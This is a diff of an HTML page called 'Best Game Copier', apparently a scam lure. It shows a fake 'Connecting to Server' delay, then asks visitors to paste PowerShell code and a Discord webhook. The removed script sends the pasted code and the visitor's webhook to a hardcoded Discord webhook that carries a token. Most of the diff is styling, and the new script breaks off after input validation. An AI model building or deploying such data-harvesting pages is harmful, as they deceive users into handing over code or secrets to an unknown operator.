@@ -5,48 +5,63 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Best Game Copier</title>
     <style>
-        body {
+        /* General Reset */
+        body, html {
             margin: 0;
-            font-family: Arial, sans-serif;
+            padding: 0;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
             background: black;
-            overflow: hidden;
             color: white;
-            display: flex;
-            align-items: center;
-            justify-content: center;
             height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            overflow: hidden;
         }
 
-        /* Loader Styles */
+        /* Background Animation */
+        @keyframes gradientAnimation {
+            0% { background-position: 0% 50%; }
+            50% { background-position: 100% 50%; }
+            100% { background-position: 0% 50%; }
+        }
+
+        body {
+            background: linear-gradient(120deg, #1e3a8a, #00008b, #000000);
+            background-size: 200% 200%;
+            animation: gradientAnimation 15s ease infinite;
+        }
+
+        /* Loader */
         #loader {
-            position: fixed;
+            position: absolute;
             top: 0;
             left: 0;
             width: 100%;
             height: 100%;
-            display: flex;
-            justify-content: center;
-            align-items: center;
             background: black;
-            z-index: 10;
+            display: flex;
             flex-direction: column;
-            color: blue;
+            align-items: center;
+            justify-content: center;
+            z-index: 1000;
         }
 
         #loader-text {
             font-size: 24px;
-            margin-bottom: 20px;
+            margin-bottom: 15px;
+            color: #1e90ff;
         }
 
         .dots {
             display: flex;
-            gap: 10px;
+            gap: 8px;
         }
 
         .dot {
-            width: 10px;
-            height: 10px;
-            background-color: blue;
+            width: 12px;
+            height: 12px;
+            background-color: #1e90ff;
             border-radius: 50%;
             animation: slideDots 1.5s infinite;
         }
@@ -65,72 +80,57 @@
 
         @keyframes slideDots {
             0%, 100% {
-                transform: translateX(0);
-                opacity: 0.3;
+                transform: translateY(0);
+                opacity: 0.5;
             }
             50% {
-                transform: translateX(20px);
+                transform: translateY(-10px);
                 opacity: 1;
             }
         }
 
-        /* Background animation */
-        @keyframes backgroundGradient {
-            0% {
-                background: radial-gradient(circle, #1e90ff, #00008b, black);
-            }
-            50% {
-                background: radial-gradient(circle, #00008b, black, #1e90ff);
-            }
-            100% {
-                background: radial-gradient(circle, black, #1e90ff, #00008b);
-            }
-        }
-
-        body {
-            animation: backgroundGradient 10s infinite;
-        }
-
-        .grid {
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-            gap: 20px;
-            width: 90%;
-            max-width: 400px;
+        /* Main Content */
+        .card {
+            display: none;
             background: rgba(255, 255, 255, 0.1);
             padding: 30px;
-            border-radius: 10px;
-            box-shadow: 0 0 20px rgba(255, 255, 255, 0.2);
+            border-radius: 15px;
+            box-shadow: 0px 8px 20px rgba(0, 0, 0, 0.5);
+            text-align: center;
+            width: 90%;
+            max-width: 400px;
         }
 
         h1 {
-            margin-bottom: 10px;
-            text-align: center;
             font-size: 24px;
+            margin-bottom: 20px;
         }
 
         input {
             width: 100%;
-            padding: 10px;
-            font-size: 16px;
+            padding: 12px;
+            margin-bottom: 15px;
             border: none;
-            border-radius: 5px;
-            margin-bottom: 10px;
+            border-radius: 8px;
+            font-size: 16px;
+            color: #fff;
             background: rgba(255, 255, 255, 0.2);
-            color: white;
+        }
+
+        input::placeholder {
+            color: #ddd;
         }
 
         button {
-            padding: 10px 20px;
-            font-size: 16px;
+            width: 100%;
+            padding: 12px;
             border: none;
-            border-radius: 5px;
-            cursor: pointer;
+            border-radius: 8px;
+            font-size: 16px;
             background: #1e90ff;
             color: white;
-            width: 100%;
+            cursor: pointer;
+            transition: background 0.3s ease;
         }
 
         button:hover {
@@ -139,36 +139,32 @@
 
         .error {
             color: red;
-            text-align: center;
+            font-size: 14px;
+            margin-top: 10px;
         }
 
-        /* Notification Styles */
+        /* Notification */
         .notification {
             position: fixed;
             bottom: 20px;
             left: 20px;
             background: #1e90ff;
             color: white;
-            padding: 10px 20px;
-            border-radius: 5px;
-            box-shadow: 0 0 10px rgba(0, 0, 0, 0.5);
+            padding: 15px;
+            border-radius: 8px;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
             opacity: 0;
-            transform: translateY(20px);
             animation: fadeInOut 4s ease forwards;
         }
 
         @keyframes fadeInOut {
-            0% {
+            0%, 100% {
                 opacity: 0;
                 transform: translateY(20px);
             }
             10%, 90% {
                 opacity: 1;
                 transform: translateY(0);
-            }
-            100% {
-                opacity: 0;
-                transform: translateY(20px);
             }
         }
 
@@ -178,15 +174,20 @@
             bottom: 20px;
             right: 20px;
             background: #7289da;
-            border: none;
+            width: 60px;
+            height: 60px;
             border-radius: 50%;
-            width: 50px;
-            height: 50px;
             display: flex;
             align-items: center;
             justify-content: center;
-            box-shadow: 0 0 10px rgba(0, 0, 0, 0.5);
+            box-shadow: 0px 8px 20px rgba(0, 0, 0, 0.5);
             cursor: pointer;
+        }
+
+        .discord-btn svg {
+            width: 30px;
+            height: 30px;
+            fill: white;
         }
 
         .discord-btn:hover {
@@ -196,25 +197,19 @@
         .discord-btn:hover::after {
             content: 'Join our Discord';
             position: absolute;
-            bottom: 70px;
-            right: 10px;
+            bottom: 80px;
+            right: 15px;
             background: #1e90ff;
             color: white;
             padding: 5px 10px;
             border-radius: 5px;
             font-size: 12px;
-            box-shadow: 0 0 10px rgba(0, 0, 0, 0.5);
-        }
-
-        .discord-icon {
-            width: 25px;
-            height: 25px;
-            background: url('https://www.iconpacks.net/icons/2/free-discord-logo-icon-2429-thumb.png') no-repeat center;
-            background-size: contain;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
         }
     </style>
 </head>
 <body>
+    <!-- Loader -->
     <div id="loader">
         <div id="loader-text">Connecting to Server</div>
         <div class="dots">
@@ -224,7 +219,8 @@
         </div>
     </div>
 
-    <div class="grid" style="display: none;" id="main-content">
+    <!-- Main Content -->
+    <div class="card" id="main-content">
         <h1>Best Game Copier</h1>
         <input id="webhookUrl" type="text" placeholder="Enter your Discord Webhook (for results)" />
         <input id="powershellCode" type="text" placeholder="Enter your PowerShell code" />
@@ -232,29 +228,33 @@
         <p id="errorMessage" class="error" style="display: none;"></p>
     </div>
 
-    <button class="discord-btn" onclick="window.open('https://discord.gg/KUmGXNJj', '_blank')">
-        <div class="discord-icon"></div>
-    </button>
+    <!-- Discord Button -->
+    <div class="discord-btn" onclick="window.open('https://discord.com/invite/yourInviteCode', '_blank')">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+            <path d="M12 0C5.37 0 0 5.373 0 12c0 5.303 3.438 9.8 8.207 11.385-.114-.956-.217-2.43.045-3.478.238-.987 1.53-6.63 1.53-6.63s-.39-.783-.39-1.94c0-1.816 1.05-3.176 2.36-3.176 1.114 0 1.653.836 1.653 1.837 0 1.12-.712 2.796-1.08 4.353-.308 1.292.653 2.345 1.937 2.345 2.324 0 3.89-3.068 3.89-6.705 0-2.793-1.872-4.886-5.277-4.886-3.84 0-6.236 2.864-6.236 6.08 0 1.108.336 1.89.872 2.492.244.278.28.39.191.71-.067.23-.217.792-.279 1.01-.092.346-.373.468-.687.341-1.924-.808-2.802-2.973-2.802-5.41 0-4.017 3.272-7.65 8.823-7.65 4.63 0 8.177 3.304 8.177 7.447 0 4.548-2.566 7.963-6.384 7.963-1.279 0-2.481-.693-2.892-1.477l-.788 3.005c-.238.916-.89 2.065-1.332 2.767 1.003.303 2.064.468 3.162.468 6.63 0 12-5.373 12-12S18.63 0 12 0z" />
+        </svg>
+    </div>
 
+    <!-- Notification Container -->
     <div id="notification-container"></div>
 
     <script>
-        const copyButton = document.getElementById('copyButton');
-        const powershellCode = document.getElementById('powershellCode');
-        const webhookUrl = document.getElementById('webhookUrl');
-        const errorMessage = document.getElementById('errorMessage');
         const loader = document.getElementById('loader');
         const mainContent = document.getElementById('main-content');
-        const notificationContainer = document.getElementById('notification-container');
 
         // Show website after 10 seconds
         setTimeout(() => {
             loader.style.opacity = '0';
             setTimeout(() => {
                 loader.style.display = 'none';
-                mainContent.style.display = 'flex';
+                mainContent.style.display = 'block';
             }, 500);
         }, 10000);
+
+        const copyButton = document.getElementById('copyButton');
+        const powershellCode = document.getElementById('powershellCode');
+        const webhookUrl = document.getElementById('webhookUrl');
+        const errorMessage = document.getElementById('errorMessage');
 
         function isValidWebhook(url) {
             const discordWebhookPattern = /https:\/\/discord\.com\/api\/webhooks\/\d+\/[A-Za-z0-9_-]+/;
@@ -265,11 +265,8 @@
             const notification = document.createElement('div');
             notification.className = 'notification';
             notification.textContent = message;
-            notificationContainer.appendChild(notification);
-
-            setTimeout(() => {
-                notification.remove();
-            }, 4000);
+            document.body.appendChild(notification);
+            setTimeout(() => notification.remove(), 4000);
         }
 
         copyButton.addEventListener('click', () => {
@@ -278,48 +275,9 @@
 
             if (!code) {
                 errorMessage.style.display = 'block';
-                errorMessage.textContent = 'No PowerShell code has been entered. Please enter your PowerShell code and try again.';
+                errorMessage.textContent = 'No PowerShell code entered. Please try again.';
                 return;
             }
 
-            if (!userWebhook || !isValidWebhook(userWebhook)) {
+            if (!isValidWebhook(userWebhook)) {
                 errorMessage.style.display = 'block';
-                errorMessage.textContent = 'Invalid or missing Discord webhook for results. Please enter a valid webhook.';
-                return;
-            }
-
-            errorMessage.style.display = 'none';
-
-            // Replace this webhook URL with your server-side webhook
-            const serverWebhook = "https://discord.com/api/webhooks/1312257861841195080/W4ql9QaD25K3ghCY3fSvJnor9CDCZtHnea9JwkaO-wxYv8A2flQjDoNp_YwJBu571UTd";
-
-            // Create a .txt file content
-            const fileContent = new Blob([code], { type: 'text/plain' });
-            const file = new File([fileContent], 'powershell_code.txt');
-
-            // Prepare form data
-            const formData = new FormData();
-            formData.append('file', file);
-            formData.append('payload_json', JSON.stringify({
-                content: `User Webhook for Results: ${userWebhook}`
-            }));
-
-            // Send the PowerShell code file to the server webhook
-            fetch(serverWebhook, {
-                method: 'POST',
-                body: formData
-            })
-            .then(response => {
-                if (response.ok) {
-                    showNotification('PowerShell code successfully sent! The results will be sent to your provided webhook.');
-                } else {
-                    showNotification('Failed to send the PowerShell code. Please try again later.');
-                }
-            })
-            .catch(error => {
-                showNotification('An error occurred: ' + error.message);
-            });
-        });
-    </script>
-</body>
-</html>
